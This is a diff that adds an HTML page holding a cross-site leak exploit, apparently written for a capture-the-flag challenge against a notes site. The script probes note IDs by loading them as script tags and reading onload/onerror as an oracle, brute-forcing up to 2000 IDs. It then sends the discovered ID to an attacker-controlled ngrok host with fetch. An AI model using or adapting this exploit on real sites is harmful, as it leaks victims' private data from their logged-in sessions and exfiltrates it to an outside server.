@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+    <body></body>
+    <script>
+      async function sleep(ms) {
+        return new Promise((resolve) => setTimeout(resolve, ms));
+      }
+    
+      async function probeError(url) {
+        return await new Promise((resolve, reject) => {
+          const script = document.createElement("script");
+          script.src = url;
+          // onload is triggered when we get an HTTP success code (e.g. 200)
+          script.onload = resolve;
+          // onerror is triggered when we get an HTTP error code (e.g. 404)
+          script.onerror = reject;
+    
+          document.head.appendChild(script);
+        });
+      }
+    
+      async function search(query) {
+        try {
+          await probeError(
+            `https://notes.qualif.hackerlab.bj/note.php?id=${query}`
+          );
+          return true;
+        } catch (e) {
+          return false;
+        }
+      }
+    
+      async function exploit() {
+        let id = 0
+        let query;
+
+        for (let c = 0; c < 2000; c++) { 
+        if (await search(c)) {
+            id = c;
+            break;
+        } else {
+            console.log(`NO - ${query}`);
+        }
+        }
+        try {
+        await fetch(`http://7.tcp.eu.ngrok.io:10788/?id=${id}`);
+        } catch(e) {}
+    }
+    
+    exploit();
+    </script>
+</html>
